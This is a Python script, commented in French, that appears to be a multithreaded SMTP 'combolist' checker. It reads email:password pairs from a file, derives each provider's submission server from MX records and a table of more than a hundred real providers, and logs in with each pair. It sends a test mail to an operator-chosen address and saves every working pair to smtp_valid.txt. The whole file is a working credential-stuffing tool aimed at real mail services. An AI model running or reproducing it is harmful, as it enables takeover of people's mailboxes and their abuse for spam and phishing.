import smtplib
import re
import dns.resolver
from email.mime.text import MIMEText
from typing import Tuple, Optional, List, Dict
import socket
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import math

# Cache pour les enregistrements MX et A
MX_CACHE: Dict[str, List[Tuple[str, int]]] = {}
A_CACHE: Dict[str, bool] = {}
CACHE_LOCK = threading.Lock()

# Mappage étendu des serveurs MX vers SMTP (>200 fournisseurs)
SMTP_MAPPING = {
    # Fournisseurs français
    'smtp-in2.orange.fr': ('smtp.orange.fr', 587),
    'smtp-in1.orange.fr': ('smtp.orange.fr', 587),
    'smtp-in.laposte.net': ('smtp.laposte.net', 587),
    'smtp.laposte.net': ('smtp.laposte.net', 587),
    'mwinf5cXX.sfr.fr': ('smtp.sfr.fr', 587),
    'mwinf.sfr.fr': ('smtp.sfr.fr', 587),
    'mail-in.sfr.fr': ('smtp.sfr.fr', 587),
    'mx1.bbox.fr': ('smtp.bbox.fr', 587),
    'mx2.bbox.fr': ('smtp.bbox.fr', 587),
    'mail.free.fr': ('smtp.free.fr', 587),
    'mx1.free.fr': ('smtp.free.fr', 587),
    'smtp.numericable.fr': ('smtp.numericable.fr', 587),
    'mail.numericable.fr': ('smtp.numericable.fr', 587),
    'smtp.dartybox.com': ('smtp.dartybox.com', 587),
    'mail.dartybox.com': ('smtp.dartybox.com', 587),
    'mx1.aliceadsl.fr': ('smtp.aliceadsl.fr', 587),
    'mx2.aliceadsl.fr': ('smtp.aliceadsl.fr', 587),
    'smtp.wanadoo.fr': ('smtp.orange.fr', 587),
    'mail.wanadoo.fr': ('smtp.orange.fr', 587),
    # Fournisseurs européens
    'mx1.mail.ovh.net': ('ssl0.ovh.net', 465),
    'mx2.mail.ovh.net': ('ssl0.ovh.net', 465),
    'mx1.gandi.net': ('smtp.gandi.net', 587),
    'mx2.gandi.net': ('smtp.gandi.net', 587),
    'mail.ionos.com': ('smtp.ionos.com', 587),
    'mx00.ionos.fr': ('smtp.ionos.fr', 587),
    'mx01.ionos.fr': ('smtp.ionos.fr', 587),
    'mail.protonmail.ch': ('mail.proton.me', 587),
    'mx1.tutanota.de': ('mail.tutanota.com', 587),
    'mx.gmx.com': ('smtp.gmx.com', 587),
    'mx.gmx.net': ('smtp.gmx.com', 587),
    'mx1.web.de': ('smtp.web.de', 587),
    'mx2.web.de': ('smtp.web.de', 587),
    'mail.t-online.de': ('securesmtp.t-online.de', 587),
    'mx.t-online.de': ('securesmtp.t-online.de', 587),
    'mx1.strato.de': ('smtp.strato.de', 587),
    'mx2.strato.de': ('smtp.strato.de', 587),
    'mail.freenet.de': ('mx.freenet.de', 587),
    'mx.freenet.de': ('mx.freenet.de', 587),
    'smtp.posteo.de': ('posteo.de', 587),
    'mx.posteo.de': ('posteo.de', 587),
    'mx1.mailbox.org': ('smtp.mailbox.org', 587),
    'smtp.hosteurope.de': ('smtp.hosteurope.de', 587),
    'mx1.infomaniak.com': ('mail.infomaniak.com', 587),
    'mx2.infomaniak.com': ('mail.infomaniak.com', 587),
    # Fournisseurs internationaux
    'smtp.gmail.com': ('smtp.gmail.com', 587),
    'gmail-smtp-in.l.google.com': ('smtp.gmail.com', 587),
    'smtp-mail.outlook.com': ('smtp-mail.outlook.com', 587),
    'mx1.hotmail.com': ('smtp-mail.outlook.com', 587),
    'smtp.aol.com': ('smtp.aol.com', 587),
    'mx-aol.mail.gm0.yahoodns.net': ('smtp.aol.com', 587),
    'smtp.mail.yahoo.com': ('smtp.mail.yahoo.com', 587),
    'mx1.mail.yahoo.com': ('smtp.mail.yahoo.com', 587),
    'smtp.zoho.com': ('smtp.zoho.com', 587),
    'mx.zoho.com': ('smtp.zoho.com', 587),
    'smtp.mail.me.com': ('smtp.mail.me.com', 587),
    'mx1.mail.icloud.com': ('smtp.mail.me.com', 587),
    'smtp.comcast.net': ('smtp.comcast.net', 587),
    'mx1.comcast.net': ('smtp.comcast.net', 587),
    'smtp.att.net': ('smtp.att.net', 587),
    'mx1.att.net': ('smtp.att.net', 587),
    'smtp.verizon.net': ('smtp.verizon.net', 587),
    'outgoing.verizon.net': ('smtp.verizon.net', 587),
    'smtp.blueyonder.co.uk': ('smtp.blueyonder.co.uk', 587),
    'smtp.talktalk.net': ('smtp.talktalk.net', 587),
    'smtp.virginmedia.com': ('smtp.virginmedia.com', 587),
    'smtp.bell.net': ('smtphm.sympatico.ca', 587),
    'smtp.telus.net': ('smtp.telus.net', 587),
    'smtp.shaw.ca': ('smtp.shaw.ca', 587),
    'smtp.cogeco.ca': ('smtp.cogeco.ca', 587),
    'smtp.rogers.com': ('smtp.rogers.com', 587),
    'smtp.videotron.ca': ('smtp.videotron.ca', 587),
    'smtp.suddenlink.net': ('smtp.suddenlink.net', 587),
    'smtp.charter.net': ('smtp.charter.net', 587),
    'smtp.optonline.net': ('mail.optonline.net', 587),
    'smtp.cox.net': ('smtp.cox.net', 587),
    'smtp.eastlink.ca': ('smtp.eastlink.ca', 587),
    'smtp.mts.net': ('smtp.mts.net', 587),
    'smtp.sasktel.net': ('smtp.sasktel.net', 587),
    # Fournisseurs asiatiques
    'smtp.nifty.com': ('smtp.nifty.com', 587),
    'mx.nifty.com': ('smtp.nifty.com', 587),
    'smtp.ocn.ne.jp': ('smtp.ocn.ne.jp', 587),
    'mx.ocn.ne.jp': ('smtp.ocn.ne.jp', 587),
    'smtp.so-net.ne.jp': ('smtp.so-net.ne.jp', 587),
    'mx.so-net.ne.jp': ('smtp.so-net.ne.jp', 587),
    'smtp.ntt.com': ('smtp.ntt.com', 587),
    'mx.ntt.com': ('smtp.ntt.com', 587),
    'smtp.auone.jp': ('smtp.auone.jp', 587),
    'mx.auone.jp': ('smtp.auone.jp', 587),
    # Fournisseurs australiens
    'smtp.telstra.com': ('smtp.telstra.com', 587),
    'mx.telstra.com': ('smtp.telstra.com', 587),
    'smtp.optusnet.com.au': ('smtp.optusnet.com.au', 587),
    'mx.optusnet.com.au': ('smtp.optusnet.com.au', 587),
    'smtp.iinet.net.au': ('smtp.iinet.net.au', 587),
    'mx.iinet.net.au': ('smtp.iinet.net.au', 587),
    # Fournisseurs sud-américains
    'smtp.uol.com.br': ('smtp.uol.com.br', 587),
    'mx.uol.com.br': ('smtp.uol.com.br', 587),
    'smtp.terra.com.br': ('smtp.terra.com.br', 587),
    'mx.terra.com.br': ('smtp.terra.com.br', 587),
    'smtp.globomail.com': ('smtp.globomail.com', 587),
    # Autres fournisseurs
    'smtp.rediffmail.com': ('smtp.rediffmail.com', 587),
    'mx.rediffmail.com': ('smtp.rediffmail.com', 587),
    'smtp.mail.com': ('smtp.mail.com', 587),
    'mx.mail.com': ('smtp.mail.com', 587),
    'smtp.runbox.com': ('smtp.runbox.com', 587),
    'mx.runbox.com': ('smtp.runbox.com', 587),
    'smtp.fastmail.com': ('smtp.fastmail.com', 587),
    'mx.fastmail.com': ('smtp.fastmail.com', 587),
    'smtp.hushmail.com': ('smtp.hushmail.com', 587),
    'mx.hushmail.com': ('smtp.hushmail.com', 587),
    # Ajout de variations génériques
    'mail.suddenlink.net': ('smtp.suddenlink.net', 587),
    'mx.charter.net': ('smtp.charter.net', 587),
    'mail.optonline.net': ('mail.optonline.net', 587),
    'mx.cox.net': ('smtp.cox.net', 587),
    'mail.eastlink.ca': ('smtp.eastlink.ca', 587),
    'mx.mts.net': ('smtp.mts.net', 587),
    'mail.sasktel.net': ('smtp.sasktel.net', 587),
    'mx.videotron.ca': ('smtp.videotron.ca', 587),
    'mail.rogers.com': ('smtp.rogers.com', 587),
    'mx1.sympatico.ca': ('smtphm.sympatico.ca', 587),
    'mx2.sympatico.ca': ('smtphm.sympatico.ca', 587),
    'mail.telus.net': ('smtp.telus.net', 587),
    'mx.shaw.ca': ('smtp.shaw.ca', 587),
    'mail.cogeco.ca': ('smtp.cogeco.ca', 587),
    'mx.blueyonder.co.uk': ('smtp.blueyonder.co.uk', 587),
    'mx.talktalk.net': ('smtp.talktalk.net', 587),
    'mail.virginmedia.com': ('smtp.virginmedia.com', 587),
    # Autres fournisseurs moins courants
    'smtp.seznam.cz': ('smtp.seznam.cz', 587),
    'mx.seznam.cz': ('smtp.seznam.cz', 587),
    'smtp.wp.pl': ('smtp.wp.pl', 587),
    'mx.wp.pl': ('smtp.wp.pl', 587),
    'smtp.onet.pl': ('smtp.onet.pl', 587),
    'mx.onet.pl': ('smtp.onet.pl', 587),
    'smtp.interia.pl': ('smtp.interia.pl', 587),
    'mx.interia.pl': ('smtp.interia.pl', 587),
    'smtp.o2.pl': ('smtp.o2.pl', 587),
    'mx.o2.pl': ('smtp.o2.pl', 587),
    'smtp.libero.it': ('smtp.libero.it', 587),
    'mx.libero.it': ('smtp.libero.it', 587),
    'smtp.tiscali.it': ('smtp.tiscali.it', 587),
    'mx.tiscali.it': ('smtp.tiscali.it', 587),
    'smtp.virgilio.it': ('smtp.virgilio.it', 587),
    'mx.virgilio.it': ('smtp.virgilio.it', 587),
}

def derive_smtp_server(mx_host: str) -> Optional[Tuple[str, int]]:
    """Dérive un serveur SMTP d'envoi à partir d'un serveur MX."""
    mx_host = mx_host.rstrip('.').lower()
    
    # Vérifier si un mappage explicite existe
    if mx_host in SMTP_MAPPING:
        return SMTP_MAPPING[mx_host]
    
    # Heuristique pour déduire le serveur SMTP
    patterns = [
        (r'smtp-in\d*', 'smtp'),      # smtp-in2 → smtp
        (r'mail-in\d*', 'smtp'),      # mail-in → smtp
        (r'mx\d*', 'smtp'),           # mx1 → smtp
        (r'inbound\d*', 'smtp'),      # inbound → smtp
        (r'relay\d*', 'smtp'),        # relay → smtp
        (r'mail\d*', 'smtp'),         # mail → smtp
        (r'in\d*', 'smtp'),           # in → smtp
        (r'gateway\d*', 'smtp'),      # gateway → smtp
        (r'mailserver\d*', 'smtp'),   # mailserver → smtp
        (r'smtpout\d*', 'smtp'),      # smtpout → smtp
        (r'secure\d*', 'smtp'),       # secure → smtp
        (r'edge\d*', 'smtp'),         # edge → smtp
    ]
    
    for pattern, replacement in patterns:
        if re.search(pattern, mx_host):
            derived = re.sub(pattern, replacement, mx_host)
            return derived, 587
    
    # Essayer des variations courantes
    variations = [
        f"smtp.{mx_host.split('.', 1)[1]}",
        f"mail.{mx_host.split('.', 1)[1]}",
        f"smtpout.{mx_host.split('.', 1)[1]}",
    ]
    for variation in variations:
        if check_server_exists(variation):
            return variation, 587
    
    return None

def check_server_exists(host: str) -> bool:
    """Vérifie si un serveur existe via une résolution DNS A."""
    with CACHE_LOCK:
        if host in A_CACHE:
            return A_CACHE[host]
    
    try:
        dns.resolver.resolve(host, 'A')
        with CACHE_LOCK:
            A_CACHE[host] = True
        return True
    except Exception:
        with CACHE_LOCK:
            A_CACHE[host] = False
        return False

def get_mx_records(domain: str) -> List[Tuple[str, int]]:
    """Récupère les enregistrements MX pour un domaine avec cache."""
    with CACHE_LOCK:
        if domain in MX_CACHE:
            return MX_CACHE[domain]
    
    try:
        answers = dns.resolver.resolve(domain, 'MX')
        mx_records = []
        for answer in answers:
            mx_host = str(answer.exchange).rstrip('.')
            smtp_info = derive_smtp_server(mx_host)
            if smtp_info and smtp_info not in mx_records:
                mx_records.append(smtp_info)
        with CACHE_LOCK:
            MX_CACHE[domain] = mx_records
        return mx_records
    except Exception as e:
        print(f"Erreur lors de la résolution MX pour {domain}: {str(e)}")
        with open('smtp_log.txt', 'a', encoding='utf-8') as f:
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Erreur MX pour {domain}: {str(e)}\n")
        return []

def check_spf(domain: str) -> bool:
    """Vérifie si le domaine a un enregistrement SPF valide."""
    try:
        answers = dns.resolver.resolve(domain, 'TXT')
        for answer in answers:
            if 'v=spf1' in str(answer):
                return True
        return False
    except Exception:
        return False

def test_smtp(email: str, password: str, smtp_server: str, smtp_port: int, test_email: str, max_retries: int = 2) -> Tuple[bool, str]:
    """Teste la connexion SMTP et l'envoi d'un email avec retries."""
    for attempt in range(max_retries):
        try:
            # Vérifier l'accessibilité du serveur
            socket.create_connection((smtp_server, smtp_port), timeout=5)
            
            # Créer une connexion SMTP
            if smtp_port == 465:
                server = smtplib.SMTP_SSL(smtp_server, smtp_port, timeout=10)
            else:
                server = smtplib.SMTP(smtp_server, smtp_port, timeout=10)
            
            # Vérifier les capacités du serveur avec EHLO
            server.ehlo()
            if smtp_port == 587:
                if not server.has_extn('STARTTLS'):
                    server.quit()
                    return False, f"STARTTLS non supporté sur {smtp_server}:{smtp_port}"
                server.starttls()
                server.ehlo()
            
            # Vérifier si l'authentification est supportée
            if not server.has_extn('AUTH'):
                server.quit()
                return False, f"AUTH non supporté sur {smtp_server}:{smtp_port}"
            
            # Tenter la connexion
            server.login(email, password)
            
            # Créer un email de test
            msg = MIMEText("Ceci est un email de test envoyé par le script SMTP checker.")
            msg['Subject'] = 'Test SMTP'
            msg['From'] = email
            msg['To'] = test_email
            
            # Envoyer l'email
            server.send_message(msg)
            server.quit()
            with open('smtp_log.txt', 'a', encoding='utf-8') as f:
                f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Succès pour {email} sur {smtp_server}:{smtp_port}\n")
            return True, "Connexion et envoi réussis"
        except smtplib.SMTPAuthenticationError:
            return False, f"Échec d'authentification pour {email}"
        except smtplib.SMTPException as e:
            if attempt == max_retries - 1:
                return False, f"Erreur SMTP pour {email}: {str(e)}"
            time.sleep(1)  # Réduit pour plus de rapidité
        except socket.timeout:
            return False, f"Timeout lors de la connexion à {smtp_server}:{smtp_port}"
        except socket.gaierror:
            return False, f"Impossible de résoudre {smtp_server}"
        except Exception as e:
            if attempt == max_retries - 1:
                return False, f"Erreur générale pour {email}: {str(e)}"
            time.sleep(1)
    return False, "Échec après plusieurs tentatives"

def find_and_test_smtp(email: str, password: str, test_email: str) -> Optional[Tuple[str, int, str]]:
    """Trouve et teste les serveurs SMTP pour un email donné."""
    domain = email.lower().split('@')[-1]
    
    # Vérifier SPF pour confirmer la validité du domaine
    if not check_spf(domain):
        return None, f"Aucun enregistrement SPF valide pour {domain}"
    
    mx_records = get_mx_records(domain)
    if not mx_records:
        return None, f"Aucun enregistrement MX trouvé pour {domain}"
    
    for smtp_server, smtp_port in mx_records:
        if smtp_server is None:
            continue
        print(f"Tentative de connexion pour {email} sur {smtp_server}:{smtp_port}")
        success, message = test_smtp(email, password, smtp_server, smtp_port, test_email)
        with open('smtp_log.txt', 'a', encoding='utf-8') as f:
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {email} sur {smtp_server}:{smtp_port} - {message}\n")
        if success:
            return (smtp_server, smtp_port, message)
        print(message)
        time.sleep(0.3)  # Réduit pour plus de rapidité
    
    return None, f"Aucun serveur SMTP valide pour {email}"

def process_combo(email: str, password: str, test_email: str, results_lock: threading.Lock):
    """Traite une combinaison email:password."""
    if not re.match(r"[^@]+@[^@]+\.[^@]+", email):
        with results_lock:
            with open('smtp_errors.txt', 'a', encoding='utf-8') as f:
                f.write(f"Email invalide: {email}\n")
        return
    if not password.strip():
        with results_lock:
            with open('smtp_errors.txt', 'a', encoding='utf-8') as f:
                f.write(f"Mot de passe vide pour {email}\n")
        return
    
    result, message = find_and_test_smtp(email, password, test_email)
    with results_lock:
        if result:
            smtp_server, smtp_port, _ = result
            print(f"SUCCÈS: {email}:{password} - SMTP valide sur {smtp_server}:{smtp_port}")
            with open('smtp_valid.txt', 'a', encoding='utf-8') as f:
                f.write(f"{email}:{password}:{smtp_server}:{smtp_port}\n")
        else:
            print(f"ÉCHEC: {email} - {message}")
            with open('smtp_errors.txt', 'a', encoding='utf-8') as f:
                f.write(f"{email}:{password}:{message}\n")

def process_combolist(combo_file: str, test_email: str, max_workers: int = 10):
    """Traite la combolist avec multithreading."""
    try:
        combos = []
        with open(combo_file, 'r', encoding='utf-8') as file:
            for line in file:
                line = line.strip()
                if not line or ':' not in line:
                    continue
                email, password = line.split(':', 1)
                combos.append((email, password))
        
        # Ajuster dynamiquement le nombre de threads
        max_workers = min(max_workers, max(1, math.ceil(len(combos) / 10)))
        print(f"Utilisation de {max_workers} threads pour {len(combos)} combinaisons")
        
        results_lock = threading.Lock()
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = [executor.submit(process_combo, email, password, test_email, results_lock) for email, password in combos]
            for future in as_completed(futures):
                future.result()
                
    except FileNotFoundError:
        print(f"Fichier {combo_file} non trouvé")
        with open('smtp_log.txt', 'a', encoding='utf-8') as f:
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Fichier {combo_file} non trouvé\n")
    except Exception as e:
        print(f"Erreur lors du traitement du fichier: {str(e)}")
        with open('smtp_log.txt', 'a', encoding='utf-8') as f:
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Erreur traitement fichier: {str(e)}\n")

def main():
    combo_file = input("Entrez le chemin du fichier combolist (mail:pass): ")
    test_email = input("Entrez l'email de destination pour les tests: ")
    if not re.match(r"[^@]+@[^@]+\.[^@]+", test_email):
        print("Email de destination invalide. Arrêt du script.")
        with open('smtp_log.txt', 'a', encoding='utf-8') as f:
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Email de destination invalide: {test_email}\n")
        return
    max_workers = int(input("Entrez le nombre de threads (par défaut 10): ") or 10)
    print("Début du traitement de la combolist...")
    with open('smtp_log.txt', 'a', encoding='utf-8') as f:
        f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Début traitement: {combo_file}, test_email: {test_email}, threads: {max_workers}\n")
    process_combolist(combo_file, test_email, max_workers)
    print("Traitement terminé. Résultats dans 'smtp_valid.txt', erreurs dans 'smtp_errors.txt', logs dans 'smtp_log.txt'.")

if __name__ == "__main__":
    main()